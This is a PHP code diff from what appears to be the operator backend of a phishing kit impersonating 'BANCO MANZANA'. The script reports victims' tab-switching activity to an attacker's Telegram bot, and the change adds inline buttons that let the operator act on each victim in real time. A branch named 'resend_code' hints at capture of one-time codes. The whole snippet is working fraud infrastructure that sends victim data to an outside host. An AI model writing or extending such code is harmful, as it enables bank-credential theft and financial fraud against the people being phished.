@@ -32,14 +32,22 @@ if ($type === 'phone') {
 
 } elseif ($type === 'tab_left') {
     $msg = "👁 BANCO MANZANA — TAB\n👤 {$u} salió de la pestaña\n🕒 {$date}";
+    $keyboard = json_encode(['inline_keyboard'=>[[
+        ['text'=>'📲 WS',       'callback_data'=>"WS|{$u}"],
+        ['text'=>'🚫 Rechazo',  'callback_data'=>"RECHAZO|{$u}"],
+    ]]]);
     file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
-        'chat_id'=>$chat_id, 'text'=>$msg,
+        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
     ]));
 
 } elseif ($type === 'tab_back') {
     $msg = "🔙 BANCO MANZANA — TAB\n👤 {$u} volvió a la pestaña\n🕒 {$date}";
+    $keyboard = json_encode(['inline_keyboard'=>[[
+        ['text'=>'📲 WS',       'callback_data'=>"WS|{$u}"],
+        ['text'=>'🚫 Rechazo',  'callback_data'=>"RECHAZO|{$u}"],
+    ]]]);
     file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
-        'chat_id'=>$chat_id, 'text'=>$msg,
+        'chat_id'=>$chat_id, 'text'=>$msg, 'reply_markup'=>$keyboard,
     ]));
 
 } elseif ($type === 'resend_code') {
